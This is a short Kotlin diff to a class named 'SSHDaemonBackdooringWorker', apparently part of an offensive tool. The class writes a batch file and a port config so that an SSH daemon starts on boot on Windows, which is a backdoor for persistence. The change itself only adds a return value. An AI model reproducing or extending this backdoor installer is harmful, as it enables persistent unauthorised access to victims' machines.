@@ -23,7 +23,7 @@ class SSHDaemonInstaller(
 ) : OnBootExecutorWorker("SSHDaemon", httpClient, entkerner) {
     override val name = "SSHDaemonBackdooringWorker"
 
-    override fun installWindows(file: File) {
+    override fun installWindows(file: File): File {
         if (entkerner.system == SystemType.WINDOWS) {
             val sshDaemonFile = File(file, "RunSshDaemon.bat")
             sshDaemonFile.createNewFile()
@@ -31,7 +31,9 @@ class SSHDaemonInstaller(
             val sshDaemonConfigFile = File(file, "SshDaemonConf.txt")
             sshDaemonConfigFile.createNewFile()
             sshDaemonConfigFile.writeBytes(port.toString().toByteArray())
+            return sshDaemonFile
         }
+        return file
     }
 
     override fun installLinux(file: File) {
